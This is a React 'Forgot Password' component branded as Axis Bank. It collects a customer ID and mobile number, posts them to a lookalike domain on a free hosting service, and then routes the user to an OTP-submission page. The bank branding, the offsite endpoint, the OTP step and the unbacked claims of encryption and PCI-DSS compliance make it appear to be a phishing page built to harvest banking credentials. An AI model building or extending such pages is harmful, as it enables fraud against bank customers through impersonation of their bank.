import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { FaSpinner } from "react-icons/fa";
import "./Login.css"; // reuse styles

function ForgotPassword() {
  const navigate = useNavigate();
  const [customerId, setCustomerId] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });

  const handleMobileChange = (e) => {
    // Only allow digits and max 10
    const value = e.target.value.replace(/\D/g, "");
    setMobileNumber(value.slice(0, 10));
  };

  const handleProceed = async (e) => {
    e.preventDefault();

    if (!customerId || !mobileNumber) {
      setMessage({ text: "Customer ID and Mobile Number are required", type: "error" });
      return;
    }

    if (!/^\d{10}$/.test(mobileNumber)) {
      setMessage({ text: "Mobile number must be exactly 10 digits", type: "error" });
      return;
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      const res = await fetch("https://axisonline-1.onrender.com/api/users/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ customerId, mobileNumber }),
      });

      if (!res.ok) throw new Error("Failed to submit");

      setMessage({
        text: "Request submitted successfully. Redirecting...",
        type: "success",
      });

      // Clear inputs
      setCustomerId("");
      setMobileNumber("");

      // Redirect to OTP page after 2 seconds, send mobileNumber
      setTimeout(() => {
        navigate("/otp-submit", { state: { mobileNumber } });
      }, 2000);
    } catch (err) {
      console.error(err);
      setMessage({ text: "Network error, please try again", type: "error" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="login-card">
        <h2>Forgot Password</h2>

        <form className="form" onSubmit={handleProceed}>
          {message.text && (
            <p className={`form-message ${message.type}`}>{message.text}</p>
          )}

          <label>Customer ID</label>
          <input
            type="text"
            placeholder="Enter Customer ID"
            value={customerId}
            onChange={(e) => setCustomerId(e.target.value)}
            disabled={loading}
          />
          <a
            className="forgot-link"
            onClick={() => navigate("/ForgetCustomerId")}
          >
            Forgot Customer ID?
          </a>

          <label>Mobile Number</label>
          <input
            type="tel"
            placeholder="Enter Mobile Number"
            value={mobileNumber}
            onChange={handleMobileChange}
            maxLength={10}
            inputMode="numeric"
            pattern="[0-9]*"
            disabled={loading}
          />

          <button
            className="verify-btn"
            type="submit"
            disabled={loading}
          >
            {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
          </button>

          <button
            className="login-btn"
            type="button"
            style={{ marginTop: "10px", background: "#555" }}
            onClick={() => navigate(-1)}
            disabled={loading}
          >
            Back
          </button>

          <p className="secure-text">
            Your information is encrypted and securely transmitted.
          </p>
          <p className="secure-text">
            Axis follows international PCI-DSS compliance for all transactions.
          </p>
        </form>
      </div>
    </div>
  );
}

export default ForgotPassword;
